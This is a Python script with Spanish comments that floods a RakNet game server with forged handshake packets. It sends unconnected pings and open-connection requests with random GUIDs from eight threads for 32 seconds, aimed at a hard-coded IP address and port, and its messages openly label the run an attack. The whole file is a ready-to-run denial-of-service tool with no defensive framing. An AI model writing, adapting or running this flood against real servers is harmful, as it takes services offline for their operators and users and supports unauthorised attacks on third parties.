import struct
import socket
import time
import threading
import random

# Configuración
ip = "46.105.222.228"        # Cambia por la IP de tu servidor objetivo
port = 53            # Cambia por el puerto del servidor
duration = 32           # Segundos
threads = 8             # Número de hilos concurrentes

# Constantes RakNet
magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
protocol_versions = [10, 11, 12, 13, 14]

def random_guid():
    # RakNet GUID es 8 bytes (unsigned long long)
    return random.getrandbits(64)

def build_unconnected_ping():
    packet_id = 0x01
    timestamp = int(time.time() * 1000)
    guid = random_guid()
    packet = struct.pack('!B', packet_id)
    packet += struct.pack('>Q', timestamp)
    packet += magic
    packet += struct.pack('>Q', guid)  # Cliente GUID extra, algunos servidores lo esperan
    return packet

def build_open_conn_req_1():
    packet_id = 0x05
    protocol_version = random.choice(protocol_versions)
    guid = random_guid()
    packet = struct.pack('!B', packet_id)
    packet += magic
    packet += struct.pack('!B', protocol_version)
    packet += struct.pack('>Q', guid)  # Cliente GUID
    return packet

def build_open_conn_req_2(port):
    packet_id = 0x07
    magic_local = magic
    client_address = socket.inet_aton("0.0.0.0")  # IP local ficticia
    client_port = struct.pack('>H', random.randint(1024, 65535))  # Puerto local aleatorio
    mtu_size = struct.pack('>H', random.choice([1400, 1492, 1500]))  # MTU típico
    guid = struct.pack('>Q', random_guid())

    packet = struct.pack('!B', packet_id)
    packet += magic_local
    packet += client_address
    packet += client_port
    packet += mtu_size
    packet += guid
    return packet

def attack_thread(ip, port, end_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while time.time() < end_time:
        # Simular tráfico real: alternar entre pasos del handshake
        r = random.random()
        if r < 0.33:
            packet = build_unconnected_ping()
        elif r < 0.66:
            packet = build_open_conn_req_1()
        else:
            packet = build_open_conn_req_2(port)
        try:
            sock.sendto(packet, (ip, port))
            sent += 1
        except Exception:
            pass
    return sent

def run_attack(ip, port, duration, threads):
    print(f"Iniciando ataque RakNet (handshake completo) contra {ip}:{port} durante {duration}s con {threads} hilos...")
    end_time = time.time() + duration
    thread_list = []
    sent_total = [0] * threads

    def thread_func(idx):
        sent_total[idx] = attack_thread(ip, port, end_time)

    for i in range(threads):
        t = threading.Thread(target=thread_func, args=(i,))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"Ataque finalizado. Paquetes enviados: {sum(sent_total)}")

if __name__ == "__main__":
    run_attack(ip, port, duration, threads)
